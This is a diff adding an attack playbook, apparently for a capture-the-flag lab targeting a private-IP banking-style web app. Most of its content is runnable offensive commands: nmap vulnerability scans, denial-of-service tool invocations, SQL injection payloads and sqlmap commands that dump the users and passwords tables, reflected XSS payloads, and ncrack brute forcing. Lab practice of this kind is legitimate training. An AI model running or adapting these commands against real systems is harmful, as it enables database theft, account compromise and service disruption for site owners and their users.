@@ -1,0 +1,56 @@
+1. Reconnaissance server
+      TCP SCAN
+         nmap -A 10.1.5.2
+         //nmap -A(Aggressive scan options) - this enables OS detection (-O), version scanning (-sV), script scanning (-sC) and traceroute (--traceroute).
+
+      Discover server vulnerabilities
+         nmap -sV -A --script vuln 10.1.5.2
+         //Nmap script vuln is the one we’ll be using to launch our next scan against vulnerable subdomains.
+
+
+2. DOS ATTACKS 
+      Sockstress | HTTP DOS
+         ./sockstress.sh 10.1.5.2 80 ethx -p payloads/http
+
+      Torshammer | Slow Post DOS
+         python torshammer.py -t 10.1.5.2 
+
+      Slow loris | HTTP DOS
+        ./slowloris.sh <SOCKS>
+        
+4. SQL Injection
+
+With sqlmap:
+SQL Injection on the user parameter when requesting the balance.
+      In user param: a' OR 1=1 -- 
+        
+      With sqlmap: 
+        Discover dbs: sqlmap -u "http://10.1.5.2/process.php?user=aa&pass=aa&drop=balance" -p "user" --dbs
+        Discover tables: sqlmap -u "http://10.1.5.2/process.php?user=aa&pass=aa&drop=balance" -p "user" -D ctf2 --tables
+        Dump users table: sqlmap -u "http://10.1.5.2/process.php?user=aa&pass=aa&drop=balance" -p "user" -D ctf2 -T users --dump
+        Dump transfers table: sqlmap -u "http://10.1.5.2/process.php?user=aa&pass=aa&drop=balance" -p "user" -D ctf2 -T transfers --dump
+      
+      Compromise user accounts with sql injection:
+        All usernames: http://10.1.5.2/process.php?user=a%27+OR+1%3D1+UNION+select+null%2C+pass%2C+user+from+users%3B+--+&pass=aa&amount=&drop=balance
+        All passwords: http://10.1.5.2/process.php?user=a%27+OR+1%3D1+UNION+select+null%2C+user%2C+pass+from+users%3B+--+&pass=aa&amount=&drop=balance
+
+        Find database user with sql injection:
+        http://10.1.5.2/process.php?user=%27+UNION+select+null%2C+null+user()+--+&pass=aa&drop=balance
+
+        Find database version with sql injection:
+        http://10.1.5.2/process.php?user=%27+UNION+select+null%2C+null+database()+--+&pass=aa&drop=balance
+        
+5.  Reflected XSS
+       In user parameter:
+            curl "http://10.1.5.2/process.php?user=<script>alert(1)</script>&pass=temp&drop=balance"
+            curl "http://10.1.5.2/process.php?user=%3Cscript%3Ealert%281%29%3C%2Fscript%3E&pass=temp&drop=balance"
+       In pass parameter:
+            curl "http://10.1.5.2/process.php?user=temp&pass=</script><script>alert("xss")</script><script>&drop=register"
+
+4. Brute forcing with ncrack
+   ./ncrack.sh 10.1.5.2 elitehacker.tx
+
+
+5. Run the "exploiter.py".
+
+   
